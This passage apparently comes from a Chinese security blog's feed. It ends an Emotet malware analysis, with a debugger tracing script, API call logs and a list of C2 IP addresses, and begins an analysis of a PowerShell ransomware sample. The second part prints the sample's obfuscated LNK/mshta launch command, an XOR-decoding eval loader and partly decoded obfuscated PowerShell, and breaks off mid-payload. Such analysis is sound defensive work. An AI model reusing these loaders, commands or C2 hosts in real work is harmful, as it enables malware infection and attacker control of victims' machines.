class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line">//定位获取模块基址地址</span><br><span class="line">mov module,3940bf</span><br><span class="line">//定位获取函数地址</span><br><span class="line">mov func,393F36</span><br><span class="line">//定位获取函数地址的返回处</span><br><span class="line">mov funcret,393f6d</span><br><span class="line">//定位网络通信函数地址</span><br><span class="line">mov netConnect,7586492c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var name</span><br><span class="line">var data</span><br><span class="line">var data1</span><br><span class="line">var data2</span><br><span class="line">var length</span><br><span class="line">var addr</span><br><span class="line">var addr1</span><br><span class="line">var IP</span><br><span class="line">var retAddr</span><br><span class="line"></span><br><span class="line">BC </span><br><span class="line">BPHWCALL</span><br><span class="line">BPHWS module,&quot;x&quot;</span><br><span class="line">BPHWS func,&quot;x&quot;</span><br><span class="line">BPHWS funcret,&quot;x&quot;</span><br><span class="line">BPHWS netConnect,&quot;x&quot;</span><br><span class="line"></span><br><span class="line">Loop1:</span><br><span class="line">RUN</span><br><span class="line">//获取模块名称</span><br><span class="line">CASE1:</span><br><span class="line">CMP eip,module</span><br><span class="line">JNE CASE2</span><br><span class="line">mov data,[ebp+30]</span><br><span class="line">jmp getmodulestr</span><br><span class="line">//获取函数名称</span><br><span class="line">CASE2:</span><br><span class="line">CMP eip,func</span><br><span class="line">JNE CASE3</span><br><span class="line">mov data,esi</span><br><span class="line">mul data,4</span><br><span class="line">mov data,[ebp+data]</span><br><span class="line">add data,ebx</span><br><span class="line">jmp getfuncstr</span><br><span class="line">//对获取到的API下内存断点</span><br><span class="line">CASE3:</span><br><span class="line">CMP eip,funcret</span><br><span class="line">JNE CASE4</span><br><span class="line">BP eax</span><br><span class="line">mov addr,eax</span><br><span class="line">mov retAddr,[esp]</span><br><span class="line">findop retAddr,#A3#</span><br><span class="line">CMP $RESULT,retAddr</span><br><span class="line">JE getSaveAddr</span><br><span class="line">JMP Loop1</span><br><span class="line">//调用该API时存放API名称</span><br><span class="line">CASE4:</span><br><span class="line">CMP eip,addr</span><br><span class="line">JNE CASE5</span><br><span class="line">BC addr</span><br><span class="line">CMP netConnect,eip</span><br><span class="line">je SaveIP</span><br><span class="line">mov addr1,esp</span><br><span class="line">mov addr1,[addr1]</span><br><span class="line">MSG $RESULT</span><br><span class="line">WRTA &quot;callSeq.txt&quot;,addr1</span><br><span class="line">WRTA &quot;callSeq.txt&quot;,&quot;\r\n&quot;</span><br><span class="line">JMP Loop1</span><br><span class="line">//网络发包API处IP信息获取</span><br><span class="line">CASE5:</span><br><span class="line">CMP eip,netConnect</span><br><span class="line">JNE CASE6</span><br><span class="line">jmp SaveIP</span><br><span class="line">//其他API动态调用</span><br><span class="line">CASE6:</span><br><span class="line">MSG &quot;地址函数调用&quot;</span><br><span class="line">MSG esp</span><br><span class="line">JMP Loop1</span><br><span class="line">//模块名称字符串存储处理</span><br><span class="line">getmodulestr:</span><br><span class="line">find data,#0000#</span><br><span class="line">sub $RESULT,data</span><br><span class="line">mov length,$RESULT</span><br><span class="line">add length,1</span><br><span class="line">jmp unicodeToAscii</span><br><span class="line"></span><br><span class="line">getfuncstr:</span><br><span class="line">MSG [data]</span><br><span class="line">WRTA &quot;callSeq.txt&quot;,[data]</span><br><span class="line">WRTA &quot;callSeq.txt&quot;,&quot;\r\n&quot;</span><br><span class="line">jmp Loop1</span><br><span class="line"></span><br><span class="line">//由于模块名称是Unicode所以需要将其转成ASCII便于存储</span><br><span class="line">unicodeToAscii:</span><br><span class="line">alloc 30</span><br><span class="line">mov data1,$RESULT</span><br><span class="line">xor data2,data2</span><br><span class="line">DIV length,2</span><br><span class="line">lable1:</span><br><span class="line">readstr  [data],1</span><br><span class="line">mov [data1],$RESULT</span><br><span class="line">add data,2</span><br><span class="line">add data2,1</span><br><span class="line">add data1,1</span><br><span class="line">CMP data2,length</span><br><span class="line">JBE lable1</span><br><span class="line">sub data1,length+1</span><br><span class="line">CMP eip,7586492c</span><br><span class="line">JE lable2</span><br><span class="line">WRTA &quot;callSeq.txt&quot;,[data1]</span><br><span class="line">WRTA &quot;callSeq.txt&quot;,&quot;\r\n&quot;</span><br><span class="line">XOR data1,data1</span><br><span class="line">XOR data,data</span><br><span class="line">jmp Loop1</span><br><span class="line">lable2:</span><br><span class="line">BP eip</span><br><span class="line">WRTA &quot;IP.txt&quot;,[data1]</span><br><span class="line">WRTA &quot;IP.txt&quot;,&quot;\r\n&quot;</span><br><span class="line">XOR data1,data1</span><br><span class="line">XOR data,data</span><br><span class="line">jmp Loop1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SaveIP:</span><br><span class="line">mov IP,ebx</span><br><span class="line">find IP,#0000#</span><br><span class="line">sub $RESULT,IP</span><br><span class="line">mov length,$RESULT</span><br><span class="line">mov data,IP</span><br><span class="line">XOR IP,IP</span><br><span class="line">JMP unicodeToAscii</span><br><span class="line"></span><br><span class="line">getSaveAddr:</span><br><span class="line">add retAddr,1</span><br><span class="line">mov data,[retAddr]</span><br><span class="line">bprm data,4</span><br><span class="line">jmp Loop1</span><br></pre></td></tr></table></figure><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">GetModuleHandleA</span><br><span class="line"><span class="number">394121</span></span><br><span class="line"></span><br><span class="line">LoadLibraryW</span><br><span class="line"><span class="number">396</span>D82</span><br><span class="line"></span><br><span class="line">OpenSCManagerW</span><br><span class="line"><span class="number">399663</span></span><br><span class="line"></span><br><span class="line">CloseServiceHandle</span><br><span class="line"><span class="number">399861</span></span><br><span class="line"></span><br><span class="line">SHGetFolderPathW</span><br><span class="line"><span class="number">3997</span>B7</span><br><span class="line"></span><br><span class="line">GetModuleFileNameW</span><br><span class="line"><span class="number">397</span>B3F</span><br><span class="line"></span><br><span class="line">PathSkipRootW</span><br><span class="line"><span class="number">397</span>A7C</span><br><span class="line"></span><br><span class="line">PathFindExtensionW</span><br><span class="line"><span class="number">397</span>A48</span><br><span class="line"></span><br><span class="line">lstrcpynW</span><br><span class="line"><span class="number">397</span>B85</span><br><span class="line"></span><br><span class="line">_snwprintf</span><br><span class="line"><span class="number">393</span>BC1</span><br><span class="line"></span><br><span class="line">FindFirstFileW</span><br><span class="line"><span class="number">393</span>C7B</span><br><span class="line"></span><br><span class="line">FindNextFileW</span><br><span class="line"><span class="number">393</span>B6D</span><br><span class="line"></span><br><span class="line">FindClose</span><br><span class="line"><span class="number">393</span>CB3</span><br><span class="line"></span><br><span class="line">GetCommandLineW</span><br><span class="line"><span class="number">399230</span></span><br><span class="line"></span><br><span class="line">CommandLineToArgvW</span><br><span class="line"><span class="number">399162</span></span><br><span class="line"></span><br><span class="line">LocalFree</span><br><span class="line"><span class="number">399263</span></span><br><span class="line"></span><br><span class="line">CreateFileW</span><br><span class="line"><span class="number">398377</span></span><br><span class="line"></span><br><span class="line">GetFileInformationByHandleEx</span><br><span class="line"><span class="number">3983</span>BC</span><br><span class="line"></span><br><span class="line">CloseHandle</span><br><span class="line"><span class="number">3983</span>F3</span><br><span class="line"></span><br><span class="line">GetSystemTimeAsFileTime</span><br><span class="line"><span class="number">3982</span>ED</span><br><span class="line"></span><br><span class="line">OpenServiceW</span><br><span class="line"><span class="number">398</span>CC9</span><br><span class="line"></span><br><span class="line">lstrcpyW</span><br><span class="line"><span class="number">398E7</span>B</span><br><span class="line"></span><br><span class="line">lstrlenW</span><br><span class="line"><span class="number">398</span>EA2</span><br><span class="line"></span><br><span class="line">GetCurrentProcessId</span><br><span class="line"><span class="number">3994</span>D8</span><br><span class="line"></span><br><span class="line">memset</span><br><span class="line"><span class="number">3938</span>DB</span><br><span class="line"></span><br><span class="line">SHFileOperationW</span><br><span class="line"><span class="number">3939</span>F7</span><br><span class="line"></span><br><span class="line">DeleteFileW</span><br><span class="line"><span class="number">393899</span></span><br><span class="line"></span><br><span class="line">SetFileInformationByHandle</span><br><span class="line"><span class="number">398138</span></span><br><span class="line"></span><br><span class="line">CreateServiceW</span><br><span class="line"><span class="number">3988</span>A2</span><br><span class="line"></span><br><span class="line">EnumServicesStatusExW</span><br><span class="line"><span class="number">3951E5</span></span><br><span class="line"></span><br><span class="line">QueryServiceConfig2W</span><br><span class="line"><span class="number">39510</span>F</span><br><span class="line"></span><br><span class="line">ChangeServiceConfig2W</span><br><span class="line"><span class="number">395197</span></span><br><span class="line"></span><br><span class="line">WaitForSingleObject</span><br><span class="line"><span class="number">3984</span>F4</span><br><span class="line"></span><br><span class="line">CreateProcessW</span><br><span class="line"><span class="number">394</span>C13</span><br></pre></td></tr></table></figure><ul><li>通过其<strong>API</strong>调用序列发现，其会检测自身文件是否在<strong>system32</strong>目录下，然后将自身拷贝到<strong>system32</strong>目录下，并创建服务来完成持久化，并直接启动<strong>system32</strong>目录下的恶意程序，退出当前程序进程，继续其恶意行为。</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201104175642547.png" alt="image-20201104175642547"></p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201104175930422.png" alt="image-20201104175930422"></p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201104180046833.png" alt="image-20201104180046833"></p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201104180129043.png" alt="image-20201104180129043"></p><ul><li>通过hash对比，发现释放到<strong>system32</strong>目录下的恶意程序和<strong>powershell</strong>下载下来的程序一样，继续按照之前的流程调试，到最终的PE程序空间使用脚本继续监测调用的<strong>API</strong></li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201104191510278.png" alt="image-20201104191510278"></p><ul><li>获取到的API调用列表进行分析，其主要的恶意行为如下：进程信息收集、系统信息收集、数据加密发送</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">//进程遍历API调用</span><br><span class="line">CreateToolhelp32Snapshot</span><br><span class="line"><span class="number">1434</span>D68</span><br><span class="line"></span><br><span class="line">kernel32.dll</span><br><span class="line">Process32FirstW</span><br><span class="line"><span class="number">1434</span>D16</span><br><span class="line"></span><br><span class="line">kernel32.dll</span><br><span class="line">GetCurrentProcessId</span><br><span class="line"><span class="number">1434846</span></span><br><span class="line"></span><br><span class="line">kernel32.dll</span><br><span class="line">Process32NextW</span><br><span class="line"><span class="number">1434</span>D16</span><br><span class="line"></span><br><span class="line">kernel32.dll</span><br><span class="line">OpenProcess</span><br><span class="line"><span class="number">143471</span>C</span><br><span class="line"></span><br><span class="line">kernel32.dll</span><br><span class="line">QueryFullProcessImageNameW</span><br><span class="line"><span class="number">1434751</span></span><br><span class="line"></span><br><span class="line">SHLWAPI.dll</span><br><span class="line">PathFindFileNameW</span><br><span class="line"><span class="number">14392</span>F7</span><br><span class="line"></span><br><span class="line">kernel32.dll</span><br><span class="line">CreateEventW</span><br><span class="line"><span class="number">1439</span>DAC</span><br><span class="line"></span><br><span class="line">kernel32.dll</span><br><span class="line">CreateThread</span><br><span class="line"><span class="number">1439</span>DF4</span><br><span class="line">//加密准备</span><br><span class="line">Advapi32.dll</span><br><span class="line">CryptAcquireContextW</span><br><span class="line"><span class="number">1432832</span></span><br><span class="line"></span><br><span class="line">crypt32.dll</span><br><span class="line">CryptDecodeObjectEx</span><br><span class="line"><span class="number">14329</span>EC</span><br><span class="line"></span><br><span class="line">Advapi32.dll</span><br><span class="line">CryptImportKey</span><br><span class="line"><span class="number">143295</span>B</span><br><span class="line"></span><br><span class="line">Advapi32.dll</span><br><span class="line">CryptGenKey</span><br><span class="line"><span class="number">1432</span>A47</span><br><span class="line"></span><br><span class="line">Advapi32.dll</span><br><span class="line">CryptCreateHash</span><br><span class="line"><span class="number">14328</span>C1</span><br><span class="line">//系统信息获取</span><br><span class="line">kernel32.dll</span><br><span class="line">GetWindowsDirectoryW</span><br><span class="line"><span class="number">14354</span>FD</span><br><span class="line"></span><br><span class="line">kernel32.dll</span><br><span class="line">GetVolumeInformationW</span><br><span class="line"><span class="number">1435563</span></span><br><span class="line"></span><br><span class="line">kernel32.dll</span><br><span class="line">GetComputerNameA</span><br><span class="line"><span class="number">1436063</span></span><br><span class="line"></span><br><span class="line">ntdll.dll</span><br><span class="line">RtlGetVersion</span><br><span class="line"><span class="number">1435423</span></span><br><span class="line"></span><br><span class="line">kernel32.dll</span><br><span class="line">GetNativeSystemInfo</span><br><span class="line"><span class="number">1435490</span></span><br><span class="line"></span><br><span class="line">kernel32.dll</span><br><span class="line">ProcessIdToSessionId</span><br><span class="line"><span class="number">14347</span>F5</span><br><span class="line"></span><br><span class="line">//网络数据发送</span><br><span class="line">WININET.dll</span><br><span class="line">InternetOpenW</span><br><span class="line"><span class="number">1432</span>E9E</span><br><span class="line"></span><br><span class="line">WININET.dll</span><br><span class="line">InternetConnectW</span><br><span class="line"></span><br><span class="line">WININET.dll</span><br><span class="line">HttpOpenRequestW</span><br><span class="line"><span class="number">1432</span>FBF</span><br><span class="line"></span><br><span class="line">WININET.dll</span><br><span class="line">HttpSendRequestW</span><br><span class="line"><span class="number">143306</span>A</span><br><span class="line"></span><br><span class="line">WININET.dll</span><br><span class="line">InternetCloseHandle</span><br><span class="line"><span class="number">1432</span>F62</span><br></pre></td></tr></table></figure><ul><li>这里定位InternetConnectW函数，从内存中取出IP地址，在脚本运行过程中发现其将系统信息加密后发送给了大量的C2，同时本地创建一个线程等待C2的回复数据包。</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20201104193834356.png" alt="image-20201104193834356"></p><ul><li>这里使用脚本提取到部分的IP，当C2回复数据之后，其创建的等待线程会继续执行后续的恶意行为，由于这里调试时C2没有回复数据，所以无法继续继续分析其后续功能。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">46.105.131.79</span><br><span class="line">87.106.136.232</span><br><span class="line">75.139.38.211</span><br><span class="line">124.41.215.226</span><br><span class="line">203.153.216.189</span><br><span class="line">162.241.242.173</span><br><span class="line">219.74.18.66</span><br><span class="line">174.45.13.118</span><br><span class="line">68.188.112.97</span><br><span class="line">200.114.213.233</span><br><span class="line">213.196.135.145</span><br><span class="line">61.92.17.12</span><br><span class="line">61.19.246.238</span><br><span class="line">219.75.128.166</span><br><span class="line">120.150.60.189</span><br><span class="line">123.176.25.234</span><br><span class="line">1.221.254.82</span><br><span class="line">137.119.36.33</span><br><span class="line">94.23.237.171</span><br><span class="line">74.120.55.163</span><br><span class="line">62.30.7.67</span><br><span class="line">104.131.11.150</span><br><span class="line">139.59.67.118</span><br><span class="line">.....</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​        Emotet目前是全球最流行的木马之一，其多通过钓鱼邮件进行传播，再被木马入侵后，往往会潜伏在用户机器上进行后续的数据窃取。这里分析到的是木马的主要驻留程序，其在与控制C2建立联系后，很可能会进行更加具有威胁的攻击行为，如：加密用户数据进行勒索、网络攻击等其他行为。所以用户在收到未知来源的邮件或文档时，需要保持警惕，切勿轻易打开邮件或文档。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Emotet病毒分析报告&quot;&gt;&lt;a href=&quot;#Emotet病毒分析报告&quot; class=&quot;headerlink&quot; title=&quot;Emotet病毒分析报告&quot;&gt;&lt;/a&gt;Emotet病毒分析报告&lt;/h1&gt;&lt;h2 id=&quot;样本基础信息&quot;&gt;&lt;a href=&quot;#样本基础信息&quot;
      
    
    </summary>
    
      <category term="恶意软件分析" scheme="https://richard447.github.io/categories/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    
    
      <category term="Emotet病毒" scheme="https://richard447.github.io/tags/Emotet%E7%97%85%E6%AF%92/"/>
    
  </entry>
  
  <entry>
    <title>Powershell勒索病毒</title>
    <link href="https://richard447.github.io/2020/07/20/%E4%B8%80%E4%B8%AA%E5%A4%9A%E5%B1%82%E5%8A%A0%E5%AF%86%E6%B7%B7%E6%B7%86%E7%9A%84powershell%E6%9C%A8%E9%A9%AC&amp;%E5%8B%92%E7%B4%A2%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/"/>
    <id>https://richard447.github.io/2020/07/20/一个多层加密混淆的powershell木马&amp;勒索恶意软件/</id>
    <published>2020-07-19T16:00:00.000Z</published>
    <updated>2021-03-06T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="powershell勒索病毒"><a href="#powershell勒索病毒" class="headerlink" title="powershell勒索病毒"></a>powershell勒索病毒</h1><p>[toc]</p><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>​        偶然在twitter上发现这个使用powershell脚本完成勒索的软件，样本里面采用了多层混淆、压缩、加密，并且核心的驻留程序和文件加密程序全部都是powershell脚本，在勒索病毒中实属少见。</p><h4 id="样本基础信息"><a href="#样本基础信息" class="headerlink" title="样本基础信息"></a>样本基础信息</h4><table><thead><tr><th><strong>Name</strong></th><th><strong>N-388-30.06.2020.docx</strong></th></tr></thead><tbody><tr><td><strong>Size</strong></td><td><strong>62387 bytes</strong></td></tr><tr><td><strong>MD5</strong></td><td><strong>7B5F028144AA35AFDF9F4835FA5432B8</strong></td></tr><tr><td><strong>SHA1</strong></td><td><strong>8BF59BAF6A003C279E95540BFB92149F6F0BA668</strong></td></tr></tbody></table><h4 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h4><ul><li>从<a href="https://app.any.run/tasks/ba79f055-2be3-41eb-ac6f-4c27692ef92d/">AnyRun</a>上拿到样本，解压，样本的本体是一个lnk快捷方式文件，并且从属性中可得到其执行的目标命令：</li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200713141853410.png" alt="image-20200713141853410"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">%comspec%</span> /v /c <span class="built_in">set</span> m=m^s^h^ta &amp;&amp; <span class="built_in">set</span> a=N-<span class="number">388</span>-^<span class="number">30</span>.<span class="number">06</span>.^<span class="number">2020</span>.^docx.l^nk &amp;&amp; <span class="keyword">if</span> <span class="keyword">exist</span> &quot;<span class="variable">!cd!</span>\<span class="variable">!a!</span>&quot; (<span class="variable">!m!</span> &quot;<span class="variable">!cd!</span>\<span class="variable">!a!</span>&quot;) <span class="keyword">else</span> (<span class="variable">!m!</span> &quot;<span class="variable">!temp!</span>\Temp1_За^прос.z^ip\<span class="variable">!a!</span>&quot;)</span><br></pre></td></tr></table></figure><ul><li><p>分析其命令，在打开该快捷方式的时候将使用mshta来打开样本文件，mshta可以打开并运行hta文件，能够识别文件中的html标签并执行js脚本，使用010和notepad打开样本，发现其实际显示的是system32下的cmd.exe的文件数据，这是因为快捷方式的目标中使用<code>%comspec%</code>将文件指向了cmd.exe，所以无法查看到源文件的数据</p><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200713153128587.png" alt="image-20200713153128587"></p></li><li><p>有趣的是，使用pestudio打开该文件，发现其中有一串javascript的代码，如果mshta解析到这串数据，应该会执行这段代码。分析这串代码：</p></li></ul><p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200713165441139.png" alt="image-20200713165441139"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">qUpYe</span>(<span class="params">hEKWD,KKuEc</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> xxQKS=[];<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;hEKWD.length;i+=<span class="number">1</span>)&#123;</span><br><span class="line">        xxQKS.push(<span class="built_in">String</span>.fromCharCode(hEKWD[i]^KKuEc.charCodeAt(i%KKuEc.length)))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> xxQKS.join(<span class="string">&quot;&quot;</span>)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">eval</span>(qUpYe(<span class="string">&quot;17Qop38Qop58Qop34Qop9Qop56Qop122Qop52Qop3Qop60Qop61Qop60Qop3Qop27Qop59Qop110Qop86Qop99Qop100Qop111Qop93Qop66Qop94Qop48Qop7Qop61Qop116Qop53Qop3Qop63Qop53Qop52Qop7Qop59Qop59Qop52Qop70Qop114Qop116Qop100Qop62*****(省略后续数据)&quot;</span>.split(<span class="string">&#x27;Qop&#x27;</span>), <span class="string">&quot;fOTF&quot;</span>))</span><br></pre></td></tr></table></figure><ul><li>代码中有一个解密函数qUpYe，将固定的这串字符串解密然后用eval函数执行，在浏览器中调试，获得解密后的数据:</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;window.resizeTo(0,0);   ##设置窗口大小不可见</span></span><br><span class="line"><span class="string">var separator = &quot;</span>XUNDAdTsTpfETGe<span class="string">&quot;;  ##脚本定位符</span></span><br><span class="line"><span class="string">var originalextension = &quot;</span>.lnk<span class="string">&quot;;</span></span><br><span class="line"><span class="string">var toexecute = &quot;</span>-nop -c <span class="keyword">while</span>(!(.(\<span class="string">&quot;\&quot;\&quot;&#123;0&#125;&#123;1&#125;&#123;2&#125;\&quot;\&quot;\&quot;-f (\&quot;\&quot;\&quot;&#123;1&#125;&#123;0&#125;\&quot;\&quot;\&quot; -f &#x27;st-&#x27;,&#x27;Te&#x27;),(\&quot;\&quot;\&quot;&#123;2&#125;&#123;1&#125;&#123;0&#125;\&quot;\&quot;\&quot; -f &#x27;ec&#x27;,&#x27;onn&#x27;,&#x27;C&#x27;),(\&quot;\&quot;\&quot;&#123;1&#125;&#123;0&#125;\&quot;\&quot;\&quot;-f&#x27;n&#x27;,&#x27;tio&#x27;)) (\&quot;\&quot;\&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;\&quot;\&quot;\&quot; -f (\&quot;\&quot;\&quot;&#123;0&#125;&#123;1&#125;\&quot;\&quot;\&quot;-f(\&quot;\&quot;\&quot;&#123;1&#125;&#123;0&#125;\&quot;\&quot;\&quot;-f&#x27;.c&#x27;,&#x27;le&#x27;),&#x27;om&#x27;),&#x27;g&#x27;,&#x27;oog&#x27;) -q)) &#123;&amp;(\&quot;\&quot;\&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;&#123;3&#125;\&quot;\&quot;\&quot; -f (\&quot;\&quot;\&quot;&#123;0&#125;&#123;1&#125;\&quot;\&quot;\&quot; -f(\&quot;\&quot;\&quot;&#123;0&#125;&#123;1&#125;\&quot;\&quot;\&quot; -f &#x27;a&#x27;,&#x27;rt-&#x27;),&#x27;Sl&#x27;),&#x27;S&#x27;,&#x27;t&#x27;,&#x27;eep&#x27;) -s 5&#125; .(\&quot;\&quot;\&quot;&#123;1&#125;&#123;0&#125;\&quot;\&quot;\&quot; -f&#x27;ex&#x27;,&#x27;i&#x27;)(.(\&quot;\&quot;\&quot;&#123;2&#125;&#123;1&#125;&#123;0&#125;\&quot;\&quot;\&quot; -f&#x27;t&#x27;,(\&quot;\&quot;\&quot;&#123;1&#125;&#123;0&#125;\&quot;\&quot;\&quot;-f 